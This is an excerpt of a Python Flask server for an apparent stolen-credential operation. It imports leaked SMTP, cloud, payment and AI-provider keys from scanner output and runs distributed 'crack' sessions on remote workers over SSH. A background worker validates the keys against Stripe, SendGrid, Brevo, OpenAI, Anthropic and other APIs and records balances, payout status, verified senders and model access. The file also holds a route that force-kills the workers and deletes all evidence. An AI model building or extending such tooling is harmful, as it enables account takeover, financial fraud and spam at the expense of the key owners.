...
FILE_MAPPING = {
    ...
    'smtp_valid.txt': ('SMTP', 'valid', 'compound'),
    ...
    # HITS - Only count
    'smtp_found.txt': ('SMTP', 'hit', 'compound'),
    # Extended credential types generated by newer scanner builds
    'Azure_SAS_Token_found.txt':    ('Azure',        'hit'),
    'Cloudflare_Global_found.txt':  ('Cloudflare',   'hit'),
    'DigitalOcean_PAT_found.txt':   ('DigitalOcean', 'hit'),
                ...
                for line in f:
                    ...
                    if cursor.rowcount > 0:
                        if status == 'valid':
                            ...
                            imported_hits += 1
                        if cred_type in _ENRICH_TYPES:
                            try:
                                _enrich_queue.put_nowait((cursor.lastrowid, cred_type, key_value, source_url, metadata))
                            except queue.Full:
                                pass
...
SCANNER_CONFIG_SCHEMA = {
    ...
    'api_validation': [
        ...
        # Extended AI providers (routes through detectors_ai_extended.go)
        'gemini', 'xai', 'mistral', 'elevenlabs', 'groq', 'perplexity',
        'openrouter', 'huggingface', 'replicate', 'cohere', 'togetherai', 'fireworks',
        # Infrastructure / compound credential types
        'mysql', 'postgresql', 'redis', 'cpanel', 'ftp', 'wordpress',
    ],
...
def api_warc_start():
    ...
    if nodes and len(nodes) > 1:
        ...
        # ── Queue remote workers as "starting"; set up each in background ────
        worker_nodes = [nd for nd in nodes if nd != 'controller']
        for nd in worker_nodes:
            node_results.append({'id': nd, 'status': 'starting', 'max_domains': per_node_max})

        # Capture loop vars for the closure
        _src_flag_val = ','.join(source_list) if source_list != ['cc'] else ''
        _crt_tld_val = crt_tld or ''
        _crt_domain_val = crt_domain or ''
        _crtsh_val = crtsh_enabled

        def _start_worker(nd, run_id, per_max, per_snaps, ext_w, test_w,
                          src_flag, crt_tld_flag, crt_domain_flag, crtsh_flag):
            remote_dir = '/root/python_job'
            remote_binary = f'{remote_dir}/reconx-warc'
            result = {'id': nd, 'max_domains': per_max}
            try:
                mgr = get_ssh_manager()
                if not mgr:
                    result.update({'status': 'failed', 'error': 'SSH manager unavailable'})
                    return
                ...
                if remote_size != local_size:
                    if not mgr.scp_upload(nd, WARC_BINARY, remote_binary):
                        result.update({'status': 'failed', 'error': 'SCP binary upload failed'})
                        return
                mgr.ssh_exec(nd, f'chmod +x {remote_binary}', 5)

                snap_flag = f' -snapshots {per_snaps}' if per_snaps > 0 else ''
                s_flag = f' -source {src_flag}' if src_flag else ''
                c_flag = ''
                if crtsh_flag:
                    if crt_tld_flag:
                        c_flag += f' -crt-tld {crt_tld_flag}'
                    if crt_domain_flag:
                        c_flag += f' -crt-domain {crt_domain_flag}'

                remote_cmd = (
                    f'cd {remote_dir} && '
                    f'nohup ./reconx-warc -max-domains {per_max} '
                    f'-output live_domains.txt '
                    f'-extract-workers {ext_w} '
                    f'-test-workers {test_w}'
                    f'{snap_flag}{s_flag}{c_flag} '
                    f'> warc.log 2>&1 & PID=$!; echo $PID > warc.pid; echo $PID'
                )
                out = mgr.ssh_exec(nd, remote_cmd, 60)
                if not (out or '').strip():
                ...
                if remote_pid:
                    ...
                    result.update({'status': 'failed', 'error': f'PID parse failed from: {out!r}'})
            except Exception as exc:
                result.update({'status': 'failed', 'error': str(exc)})
            finally:
                with _warc_lock:
                    nodes_list = _warc_state.get('dist_nodes', [])
        ...
        for nd in worker_nodes:
            threading.Thread(
                ...
                args=(nd, run_id_dist, per_node_max, per_node_snaps,
                      extract_workers, test_workers,
                      _src_flag_val, _crt_tld_val, _crt_domain_val, _crtsh_val),
                daemon=True,
            ).start()

        # Update state immediately — workers update their entries when done
        with _warc_lock:
            ...
            _warc_state.update({
                ...
                'pid': controller_pid,
                'run_id': run_id_dist,
                'output_path': snap_dict.get('output_path'),
                'log_path': snap_dict.get('log_path'),
        ...
        return jsonify({
            ...
            'nodes': node_results,
            'started': len(started),
            'workers_starting': len(worker_nodes),
            'max_domains': max_domains,
        })
...
# ── Background credential enrichment ─────────────────────────────────────────
# Providers for which we auto-call _rich_recheck after import so verify_meta
# is populated immediately (subscription type, balance, model count, etc.).
_ENRICH_TYPES = frozenset({
    'Gemini', 'OpenAI', 'Anthropic', 'HuggingFace', 'xAI', 'Mistral',
    'ElevenLabs', 'Groq', 'Perplexity', 'OpenRouter', 'Cohere', 'TogetherAI',
    'Fireworks', 'Replicate',
    'Stripe', 'Twilio',
    'SendGrid', 'Mailgun', 'Postmark', 'Brevo', 'MailerSend', 'SparkPost',
    'Mailtrap', 'Mailjet', 'GitHub',
})
_enrich_queue: queue.Queue = queue.Queue(maxsize=500)

def _enrich_worker():
    """Background thread: pop (cred_id, type, key, url, meta) tuples, call
    _rich_recheck, and store the result in verify_meta.  Throttled to 1
    credential per 1.5 s to avoid hammering provider APIs."""
    while True:
        try:
            item = _enrich_queue.get(timeout=10)
        except queue.Empty:
            continue
        try:
            cred_id, cred_type, key_value, source_url, metadata = item
            result = _rich_recheck(cred_type, key_value, source_url or '', metadata or '')
            if result.get('live') and result.get('rich'):
                rich_str = json.dumps(result['rich'])
                conn = sqlite3.connect(DB_PATH, timeout=15)
                conn.execute(
                    'UPDATE credentials SET verify_meta=?, last_verified=? WHERE id=?',
                    (rich_str, datetime.now().isoformat(), cred_id))
                conn.commit()
                conn.close()
        except Exception as e:
            print(f'[enrich] {e}')
...
threading.Thread(target=_enrich_worker, daemon=True, name='enrich-worker').start()
...
_CRACK_ADDON_SCANNER_KEY = {
    ...
    'smtp':          'scanning_features.smtp_credentials_scan',
                ...
                with _crack_lock:
                    for sid, sess in sessions_copy.items():
                        if sid not in _crack_sessions:
                            continue
                        # Apply 'completed' whenever the snapshot says so.
                        # The previous guard `!= 'running'` was inverted and caused
                        # the liveness monitor to write "running" back to disk on
                        # every cycle after all workers exited, permanently preventing
                        # the session from completing when SSH was the first to detect it.
                        if sess.get('status') == 'completed':
                            _crack_sessions[sid].update({
                                'status': 'completed',
                                'finished_at': sess.get('finished_at') or _crack_sessions[sid].get('finished_at'),
                            })
...
# Clear any stale scope unit from a prior session before creating a new one.
systemctl stop reconx-scanner-scope.scope 2>/dev/null || true
systemctl reset-failed reconx-scanner-scope.scope 2>/dev/null || true
...
def _dispatch_crack_worker(mgr, ip: str, session_id: str, remote_dir: str,
    ...
    try:
        ...
        if isinstance(slice_lines, list):
            _slice_limit = len(slice_lines)
        else:
            # slice_lines is a file path — len() returns path char count, not line count
            try:
                with open(_targets_upload_path, 'r', errors='ignore') as _sf:
                    _slice_limit = sum(1 for _l in _sf if _l.strip())
            except Exception:
                _slice_limit = 0
        remote_cmd = (
            f"cd {remote_dir} && "
...
def _collect_crack_results(sess: dict) -> None:
    ...
    session_id_c = sess.get('id') or sess.get('session_id') or ''
    # Deduplicate: multiple gunicorn workers may each spawn a poll thread for
    # the same session on restart; all would detect completion simultaneously.
    # Use a file-persisted flag to ensure collection + TG notification fires once.
    if session_id_c:
        with _crack_lock:
            _reload_crack_state_if_changed()
            if _crack_sessions.get(session_id_c, {}).get('collected_at'):
                return  # already collected by another worker/thread
            if session_id_c in _crack_sessions:
                _crack_sessions[session_id_c]['collected_at'] = datetime.now().isoformat()
            _save_crack_sessions(_crack_sessions)
    ...
    try:
        import_from_files(session_id=session_id_c or None)
    except Exception as e:
    ...
    try:
        ...
        targets      = sess.get('targets_count') or sess.get('targets') or 0
...
def api_crack_stop(sid):
    ...
    stopped immediately (non-blocking) and SSH kill runs in background."""
    with _crack_lock:
        _reload_crack_state_if_changed()
        sess = _crack_sessions.get(sid)
        if sess is None:
            return jsonify({'ok': False, 'error': 'not found'}), 404
        # Flip status immediately so the UI unblocks without waiting for SSH.
        worker_pids = dict(sess.get('remote_pids') or {})
        worker_ips  = list(sess.get('worker_ips') or list(worker_pids.keys()))
    ...
    def _bg_kill(pids, ips, snap):
        mgr = get_ssh_manager()
        if mgr is None:
            return
        # Kill by PID first, then fallback pkill in case PID drifted
        for ip, pid in pids.items():
            try:
                _ssh_exec_retry(mgr, ip,
                ...
                print(f'[crack] stop pid kill failed for {ip} pid {pid}: {e}')
        for ip in ips:
            try:
                _ssh_exec_retry(mgr, ip,
                    'pkill -TERM -x reconx-scanner 2>/dev/null; '
                    'sleep 2; pkill -KILL -x reconx-scanner 2>/dev/null; '
                    'rm -f /tmp/reconx_session.conf; true', 8)
            except Exception as e:
                print(f'[crack] stop pkill failed for {ip}: {e}')
        _collect_crack_results(snap)

    threading.Thread(target=_bg_kill, args=(worker_pids, worker_ips, _sess_snap), daemon=True).start()
...
@app.route('/api/crack/wipe-all', methods=['POST'])
def api_crack_wipe_all():
    """Nuclear reset: kill all scanners on all workers, clear every session
    from crack_sessions.json, and truncate the credentials DB table.
    Returns counts of sessions cleared and rows deleted."""
    # Collect all known worker IPs and session dirs before wiping state.
    with _crack_lock:
        _reload_crack_state_if_changed()
        all_sessions = dict(_crack_sessions)
        _crack_sessions.clear()
        _save_crack_sessions(_crack_sessions)
    try:
        global _crack_sessions_mtime
        _crack_sessions_mtime = os.path.getmtime(CRACK_SESSIONS_FILE)
    ...
    # Gather unique IPs and remote dirs across all sessions.
    all_ips: set = set()
    remote_dirs: list = []
    for s in all_sessions.values():
        for ip in (s.get('worker_ips') or list((s.get('remote_pids') or {}).keys())):
            all_ips.add(ip)
        rd = s.get('remote_dir') or ''
        if rd.startswith('/root/python_job/crack_'):
            remote_dirs.append((list(s.get('worker_ips') or []), rd))

    # Kill all scanners and clean up on every worker.
    def _kill_workers(ips, dirs):
        mgr = get_ssh_manager()
        if mgr is None:
            return
        for ip in ips:
            try:
                mgr.ssh_exec(ip,
                    'pkill -KILL -x reconx-scanner 2>/dev/null; '
                    'rm -f /tmp/reconx_session.conf checkpoint.txt 2>/dev/null; true', 8)
            except Exception as e:
                print(f'[wipe-all] kill failed on {ip}: {e}')
        for worker_ips, rd in dirs:
            for ip in worker_ips:
                try:
                    mgr.ssh_exec(ip, f'rm -rf {rd}', 5)
                except Exception:
                    pass

    threading.Thread(target=_kill_workers, args=(list(all_ips), remote_dirs), daemon=True).start()

    # Truncate credentials table.
    rows_deleted = 0
    try:
        conn = sqlite3.connect(DB_PATH, timeout=30)
        cur = conn.cursor()
        ...
        cur.execute("DELETE FROM sqlite_sequence WHERE name='credentials'")
        conn.commit()
        conn.close()
    except Exception as e:
        print(f'[wipe-all] DB truncate failed: {e}')

    print(f'[wipe-all] cleared {len(all_sessions)} session(s), {rows_deleted} credential row(s)')
    return jsonify({'ok': True, 'sessions_cleared': len(all_sessions), 'rows_deleted': rows_deleted})
    ...
    try:
        ...
        # ── SendGrid ────────────────────────────────────────────────────
            ...
            try:
                ...
                pass
            # Verified senders (email addresses)
            try:
                req4 = _ur.Request('https://api.sendgrid.com/v3/verified_senders',
                                   headers={'Authorization': f'Bearer {key_value}'})
                with _ur.urlopen(req4, timeout=10) as r4:
                    vs = _j.loads(r4.read())
                senders = [s.get('from_email', '') for s in vs.get('results', []) if s.get('verified')]
                if senders:
                    extra.append({'key': 'VERIFIED SENDERS', 'value': ', '.join(senders[:5])})
                    rich['verifiedSenders'] = senders
            except Exception:
                pass
        ...
        # ── Brevo ────────────────────────────────────────────────────────
            ...
            # Sender list
            try:
                req2 = _ur.Request('https://api.brevo.com/v3/senders',
                                   headers={'api-key': key_value, 'Accept': 'application/json'})
                with _ur.urlopen(req2, timeout=10) as r2:
                    snd = _j.loads(r2.read())
                sender_emails = [s.get('email', '') for s in snd.get('senders', []) if s.get('active')]
                if sender_emails:
                    extra.append({'key': 'SENDERS', 'value': ', '.join(sender_emails[:5])})
                    rich['brevoSenders'] = sender_emails
            except Exception:
                pass
        ...
        # ── Stripe ───────────────────────────────────────────────────────
            ...
            avail_usd = sum(b.get('amount', 0) for b in available
                            if b.get('currency', '').lower() == 'usd') or \
                        sum(b.get('amount', 0) for b in available)
            pend_usd = sum(b.get('amount', 0) for b in pending
                           if b.get('currency', '').lower() == 'usd') or \
                       sum(b.get('amount', 0) for b in pending)
            is_live = not key_value.startswith('sk_test_')
            info = f"Balance: ${avail_usd/100:.2f} | Mode: {'LIVE' if is_live else 'TEST'}"
            extra = [
                {'key': 'AVAILABLE', 'value': f'${avail_usd/100:.2f}'},
                {'key': 'PENDING', 'value': f'${pend_usd/100:.2f}'},
                {'key': 'MODE', 'value': 'LIVE' if is_live else 'TEST'},
            ]
            rich['stripeBalance'] = avail_usd
            rich['stripeMode'] = 'live' if is_live else 'test'
            # Account details — email, country, currency, charges/payouts enabled, account ID
            try:
                req_acct = _ur.Request('https://api.stripe.com/v1/account',
                                       headers={'Authorization': f'Bearer {key_value}'})
                with _ur.urlopen(req_acct, timeout=8) as r_acct:
                    acct_data = _j.loads(r_acct.read())
                acct_id = acct_data.get('id', '')
                acct_email = acct_data.get('email', '')
                acct_country = acct_data.get('country', '')
                acct_currency = acct_data.get('default_currency', '')
                charges_enabled = acct_data.get('charges_enabled', False)
                payouts_enabled = acct_data.get('payouts_enabled', False)
                can_custom = acct_data.get('type') == 'platform' or \
                             acct_data.get('capabilities', {}).get('transfers') == 'active'
                if acct_id:
                    extra.append({'key': 'ACCOUNT ID', 'value': acct_id})
                    rich['stripeAccountId'] = acct_id
                if acct_email:
                    extra.append({'key': 'EMAIL', 'value': acct_email})
                extra += [
                    {'key': 'COUNTRY', 'value': acct_country or '—'},
                    {'key': 'CURRENCY', 'value': (acct_currency or '').upper() or '—'},
                    {'key': 'CHARGES ENABLED', 'value': 'Yes' if charges_enabled else 'No'},
                    {'key': 'PAYOUTS ENABLED', 'value': 'Yes' if payouts_enabled else 'No'},
                    {'key': 'CUSTOM ACCOUNTS', 'value': 'Can Create' if can_custom else 'Cannot Create'},
                ]
                rich['stripeChargesEnabled'] = charges_enabled
                rich['stripePayoutsEnabled'] = payouts_enabled
                rich['stripeCanCustom'] = can_custom
            except Exception:
                pass
            # Connected accounts (platform / marketplace keys)
            try:
                req2 = _ur.Request('https://api.stripe.com/v1/accounts?limit=1',
                                   headers={'Authorization': f'Bearer {key_value}'})
                with _ur.urlopen(req2, timeout=8) as r2:
                    accts = _j.loads(r2.read())
                has_connected = bool(accts.get('data'))
                if has_connected:
                    extra.append({'key': 'CONNECTED ACCOUNTS', 'value': 'Yes'})
                    rich['stripeConnected'] = True
            except Exception:
                pass
            # Customers count
            try:
                req3 = _ur.Request('https://api.stripe.com/v1/customers?limit=1',
                                   headers={'Authorization': f'Bearer {key_value}'})
                with _ur.urlopen(req3, timeout=8) as r3:
                    custs = _j.loads(r3.read())
                extra.append({'key': 'HAS CUSTOMERS', 'value': 'Yes' if custs.get('data') else 'No'})
            except Exception:
                pass
        ...
        # ── OpenAI ───────────────────────────────────────────────────────
            ...
            with _ur.urlopen(req, timeout=10) as r:
                body = _j.loads(r.read())
            live = True
            models = [m['id'] for m in body.get('data', []) if isinstance(m, dict)]
            gpt4 = sorted([m for m in models if 'gpt-4' in m])[-3:]
            o_series = [m for m in models if m.startswith(('o1', 'o3', 'o4'))]
            info = f"{len(models)} models accessible"
            extra = [
                {'key': 'MODEL COUNT', 'value': str(len(models))},
                {'key': 'GPT-4 MODELS', 'value': ', '.join(gpt4) or '—'},
            ]
            if o_series:
                extra.append({'key': 'O-SERIES', 'value': ', '.join(o_series[:3])})
            rich['openaiModels'] = models[:15]
            rich['openaiHasGpt4'] = bool(gpt4)
        ...
        # ── Anthropic ────────────────────────────────────────────────────
            ...
            try:
                ...
                # 400 means the request was malformed but the key is valid
                if he.code == 400:
                    live = True
                    body = {}
                elif he.code == 401:
                    return {'live': False, 'info': 'Invalid Anthropic key', 'extra': [], 'rich': {}}
                else:
                    raise
            model_used = body.get('model', 'claude-3-haiku-20240307')
            usage = body.get('usage', {})
            info = f"Valid Anthropic key | Model: {model_used}"
            extra = [
                {'key': 'VERIFIED MODEL', 'value': model_used or 'claude-3-haiku'},
                {'key': 'INPUT TOKENS', 'value': str(usage.get('input_tokens', '—'))},
            ]
            rich['anthropicModel'] = model_used
            rich['orgName'] = 'Anthropic'
        ...
        try:
            ...
            for cred_id, cred_type, kv, su, meta in rows:
                try:
                    ...
                    vm = json.dumps(result['rich']) if result.get('rich') else None
                    conn2 = sqlite3.connect(DB_PATH, timeout=10)
                    conn2.execute(
                        'UPDATE credentials SET status=?, last_verified=CURRENT_TIMESTAMP, verify_meta=? WHERE id=?',
...
def api_findings_hits():
    ...
    try:
        ...
        c = conn.cursor()
        c.execute('''
            SELECT type, key_value, source_url, timestamp, metadata, status, id, verify_meta
            FROM credentials
            WHERE status IN ('valid', 'hit')
              AND type NOT IN ('Crypto', 'Mnemonic')
